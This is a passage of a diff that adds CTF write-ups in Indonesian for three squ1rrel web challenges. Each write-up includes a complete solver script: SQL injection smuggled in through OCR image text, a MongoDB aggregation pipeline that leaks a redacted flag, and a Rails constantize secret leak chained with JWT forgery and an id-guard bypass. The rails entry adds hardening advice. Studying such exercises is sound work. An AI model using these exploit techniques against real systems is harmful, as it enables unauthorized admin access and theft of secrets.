+        "code": "#!/usr/bin/env python3\r\nimport io\r\nimport re\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\nfrom PIL import Image, ImageDraw, ImageFont\r\n\r\nBASE_URL = \"http://hackersbotted.squ1rrel.dev\"\r\nADMIN_MARKER = \"ownedadmin\"\r\n\r\n\r\ndef build_payload_image(payload: str) -> bytes:\r\n    img = Image.new(\"RGB\", (3600, 260), \"white\")\r\n    draw = ImageDraw.Draw(img)\r\n\r\n    font_paths = [\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf\",\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf\",\r\n    ]\r\n    font = None\r\n    for fp in font_paths:\r\n        try:\r\n            font = ImageFont.truetype(fp, 58)\r\n            break\r\n        except OSError:\r\n            continue\r\n    if font is None:\r\n        font = ImageFont.load_default()\r\n\r\n    draw.text((20, 80), payload, fill=\"black\", font=font)\r\n    buf = io.BytesIO()\r\n    img.save(buf, format=\"PNG\")\r\n    return buf.getvalue()\r\n\r\n\r\ndef exploit(base_url: str) -> str:\r\n    session = requests.Session()\r\n\r\n    payload = (\r\n        \"x' UNION SELECT 'user'; \"\r\n        f\"UPDATE users SET name='{ADMIN_MARKER}' WHERE role='admin'; \"\r\n        \"SELECT 'user\"\r\n    )\r\n    image_bytes = build_payload_image(payload)\r\n\r\n    files = {\"photo\": (\"payload.png\", image_bytes, \"image/png\")}\r\n    data = {\"spotter\": \"alice\"}\r\n\r\n    # Trigger SQLi through OCR text in /api/spot\r\n    session.post(f\"{base_url}/api/spot\", files=files, data=data, timeout=20)\r\n\r\n    # Brief delay to avoid rate-limit edge and ensure update committed.\r\n    time.sleep(1.2)\r\n\r\n    r = session.post(\r\n        f\"{base_url}/api/flag\",\r\n        json={\"username\": ADMIN_MARKER},\r\n        timeout=20,\r\n    )\r\n    r.raise_for_status()\r\n    j = r.json()\r\n    if \"flag\" not in j:\r\n        raise RuntimeError(f\"Flag not found in response: {j}\")\r\n    return j[\"flag\"]\r\n\r\n\r\ndef main() -> None:\r\n    base = sys.argv[1] if len(sys.argv) > 1 else BASE_URL\r\n    flag = exploit(base)\r\n\r\n    if not re.match(r\"^[A-Za-z0-9_{}\\-]+$\", flag):\r\n        print(flag)\r\n        return\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{g3t_sp0773d_b0z0_l0l}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-web-mongolia-dist",
+    "title": "- web/mongolia",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Writeup for challenge - web/mongolia",
+    "problemDescription": "Challenge ini kasih web yang bisa:\n1. `POST /api/connect` untuk connect ke MongoDB remote dengan credential internal.\n2. `GET /api/journals` untuk baca jurnal non-secret.\n3. `POST /api/query` untuk jalankan aggregation pipeline user.\n\nData `secret:true` berisi `journal = FLAG` yang diulang 20x.\nServer mencoba nyensor flag pakai `stripFlag()`, tapi hanya ke **value**, bukan **nama key object**.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Vulnerability",
+        "content": "Di `index.js` ada fungsi:\n\n- `stripFlag(obj)`\n- Kalau `obj` string -> replace `FLAG` jadi `[REDACTED]`\n- Kalau `obj` object -> loop `for (const [k, v] of Object.entries(obj)) out[k] = stripFlag(v)`\n\nMasalahnya: `k` (nama field) tidak pernah disanitasi.\n\nEndpoint `POST /api/query` masih mengizinkan stage `$group`, dan operator `$arrayToObject` tidak masuk blacklist regex.\nArtinya kita bisa bikin object dinamis dengan key dari field `$journal` (yang berisi flag)."
+      },
+      {
+        "title": "Payload Exploit",
+        "content": "Pipeline yang dipakai:\n\n\n\nHasilnya kurang lebih:\n\n\n\nKarena flag ada di **key** object, `stripFlag()` tidak redaksi.\nLalu tinggal regex ambil token pertama `squ1rrel{...}`.",
+        "code": "[\n  {\"$match\": {\"secret\": true}},\n  {\"$limit\": 1},\n  {\n    \"$group\": {\n      \"_id\": {\n        \"$arrayToObject\": [[{\"k\": \"$journal\", \"v\": 1}]]\n      }\n    }\n  }\n]"
+      },
+      {
+        "title": "Solver",
+        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nJalankan:\n\n\n\nOutput:",
+        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/mongolia/dist\npython3 solver.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport json\r\nimport sys\r\nimport requests\r\n\r\nBASE_URL = \"https://mongolia.squ1rrel.dev\"\r\nMONGO_TARGET = \"136.112.223.118:5051/mongolia\"\r\n\r\n\r\ndef connect_session():\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/connect\",\r\n        json={\"url\": MONGO_TARGET},\r\n        timeout=20,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    token = data.get(\"token\")\r\n    if not token:\r\n        raise RuntimeError(f\"No token in response: {data}\")\r\n    return token\r\n\r\n\r\ndef query_leak(token: str):\r\n    # Leak trick: put $journal as object key via $arrayToObject.\r\n    # stripFlag() only sanitizes values, not object keys.\r\n    pipeline = [\r\n        {\"$match\": {\"secret\": True}},\r\n        {\"$limit\": 1},\r\n        {\r\n            \"$group\": {\r\n                \"_id\": {\r\n                    \"$arrayToObject\": [\r\n                        [\r\n                            {\r\n                                \"k\": \"$journal\",\r\n                                \"v\": 1,\r\n                            }\r\n                        ]\r\n                    ]\r\n                }\r\n            }\r\n        },\r\n    ]\r\n\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/query\",\r\n        headers={\"x-session-token\": token, \"content-type\": \"application/json\"},\r\n        json={\"pipeline\": json.dumps(pipeline)},\r\n        timeout=30,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    if not isinstance(data, list) or not data:\r\n        raise RuntimeError(f\"Unexpected query response: {data}\")\r\n    leaked_obj = data[0].get(\"_id\", {})\r\n    if not isinstance(leaked_obj, dict) or not leaked_obj:\r\n        raise RuntimeError(f\"Leak failed, _id not object: {data[0]}\")\r\n\r\n    # Key contains flag repeated many times.\r\n    leaked_key = next(iter(leaked_obj.keys()))\r\n    return leaked_key\r\n\r\n\r\ndef extract_flag(text: str):\r\n    m = re.search(r\"squ1rrel\\{[^}]+\\}\", text)\r\n    if not m:\r\n        raise RuntimeError(\"Flag pattern not found in leaked content\")\r\n    return m.group(0)\r\n\r\n\r\ndef main():\r\n    token = connect_session()\r\n    leaked_text = query_leak(token)\r\n    flag = extract_flag(leaked_text)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        sys.exit(1)"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{3rli4nh0tu4h_zin4li?}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-web-rails-rails-ctf-dist",
+    "title": "- web/rails",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Writeup for challenge - web/rails",
+    "problemDescription": "Challenge ini punya dua bug yang kalau digabung jadi full chain:\n1. **Unsafe constantize** di endpoint `/show/:resource`.\n2. **Auth JWT lemah** di middleware admin (cukup valid signature, tanpa validasi claim).\n\nTerus ada bug kecil lagi di controller admin:\n- Filter blokir `id == \"1\"` bisa dibypass pakai input seperti `01`, tapi query DB tetap resolve ke row `id=1`.\n\nKombinasi tiga hal itu langsung ngasih flag.",
+    "tools": [],
+    "analysis": "Endpoint yang hidup dan menarik:\n- `GET /up` -> health check.\n- `GET /admin` -> `401 Missing Admin Authentication Cookie`.\n- `GET /show/:resource` -> endpoint dinamis.\n\nDari source challenge:\n- `ShowController#index` membentuk nama class dari user input:\n  - `resource_name = @resource + \"Module\"`\n  - `resource_name.constantize.new.show`\n- Ada class `JWTModule < JWTSecret`.\n- `JWTSecret#show` return secret JWT (ENV `JWT_SECRET` atau random saat boot).\n\nArtinya `/show/JWT` akan memanggil `JWTModule#show` yang mewarisi method dari `JWTSecret` dan membocorkan signing key.",
+    "solution": [
+      {
+        "title": "1) Secret Disclosure via constantize",
+        "content": "`/show/JWT` mengembalikan secret signing JWT aplikasi."
+      },
+      {
+        "title": "2) Weak JWT Validation di `/admin`",
+        "content": "Middleware `AdminAuth` hanya melakukan:\n- Ambil cookie `auth`\n- `JWT.decode(token, hmac_secret, true, { algorithm: 'HS256' })`\n\nTidak ada cek role/admin claim sama sekali. Jadi asal token ditandatangani dengan secret yang benar, request dianggap lolos."
+      },
+      {
+        "title": "3) ID Guard Bypass",
+        "content": "Di `Admin::PostsController#index`:\n- Jika `id == \"1\"` -> raise error.\n- Lalu query: `Post.where(id: params[:id]).first`\n\nInput `01` tidak sama dengan string literal `\"1\"`, jadi guard tidak aktif. Tapi DB tetap menafsirkan nilai itu sebagai id 1, sehingga post terlarang tetap terbaca."
+      },
+      {
+        "title": "Langkah Eksploitasi",
+        "content": "1. Leak secret:\n   - Request `GET /show/JWT`\n2. Forge JWT HS256 dengan secret tadi:\n   - payload bebas (misal `{ \"user\": \"admin\" }`)\n3. Akses endpoint admin dengan cookie `auth=<token>`\n4. Bypass guard id:\n   - `GET /admin/posts?id=01`\n5. Ambil `data.content` -> flag."
+      },
+      {
+        "title": "Solver",
+        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nCara pakai:\n\n\nOpsional target custom:",
+        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/rails/rails-ctf-dist\npython3 solver.py"
+      },
+      {
+        "title": "Catatan Hardening",
+        "content": "Kalau ini aplikasi beneran, perbaikannya:\n- Jangan pakai `constantize` dari input user.\n- Jangan expose class sensitif melalui endpoint generik.\n- JWT admin wajib validasi claim (`role == admin`, `exp`, `aud`, dll).\n- Hindari guard berbasis string literal untuk ID, gunakan check yang konsisten dengan tipe data."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport requests\r\nimport jwt\r\n\r\nBASE_URL = \"https://rails.squ1rrel.dev\"\r\nTIMEOUT = 10\r\n\r\n\r\ndef get_jwt_secret(base_url: str) -> str:\r\n    r = requests.get(f\"{base_url}/show/JWT\", timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    secret = data.get(\"data\")\r\n    if not secret:\r\n        raise RuntimeError(\"JWT secret tidak ditemukan dari /show/JWT\")\r\n    return secret\r\n\r\n\r\ndef forge_token(secret: str) -> str:\r\n    payload = {\"user\": \"admin\"}\r\n    return jwt.encode(payload, secret, algorithm=\"HS256\")\r\n\r\n\r\ndef get_flag(base_url: str, token: str) -> str:\r\n    # Bypass guard id == \"1\" dengan varian numerik yang tetap match ke row id=1 di DB\r\n    params = {\"id\": \"01\"}\r\n    cookies = {\"auth\": token}\r\n    r = requests.get(f\"{base_url}/admin/posts\", params=params, cookies=cookies, timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n\r\n    j = r.json()\r\n    content = (((j or {}).get(\"data\") or {}).get(\"content\"))\r\n    if not content:\r\n        raise RuntimeError(\"Konten post tidak ditemukan\")\r\n    return content\r\n\r\n\r\ndef main():\r\n    base = BASE_URL\r\n    if len(sys.argv) > 1:\r\n        base = sys.argv[1].rstrip(\"/\")\r\n\r\n    secret = get_jwt_secret(base)\r\n    token = forge_token(secret)\r\n    flag = get_flag(base, token)\r\n\r\n    print(\"[+] JWT Secret:\", secret)\r\n    print(\"[+] Forged Token:\", token)\r\n    print(\"[+] Flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{rails?_in_my_ctf???}",
     "lessonsLearned": ""
   }
 ];
